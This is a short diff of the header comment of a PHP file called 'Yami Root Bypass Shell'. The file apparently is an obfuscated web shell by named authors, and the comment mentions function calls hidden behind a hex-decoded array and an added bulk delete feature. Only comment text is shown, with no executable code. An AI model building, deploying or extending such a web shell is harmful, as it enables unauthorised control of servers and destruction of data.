@@ -1,11 +1,8 @@
 <?php
 /**
- * Yami Root Bypass Shell — VoidGate Edition 
-  by Nyx6st × 0x6ick — Copyright © 2025, 6ickZoneShell
+ * Yami Root Bypass Shell —  Yami Root Series
+  by Nyx6st × 0x6ick — Copyright © 2025
  *
- * =================================================================
- * THIS SCRIPT HAS BEEN OBFUSCATED (VERSION 3 - BULK DELETE ADDED)
- * =================================================================
  * All standard PHP function calls have been replaced with calls via a hex-decoded array.
  * This version adds the bulk delete functionality.
  * recode boleh ijin dulu jan asal delete author su 0x6ick.my.id Or 0x6ick.blogspot.com
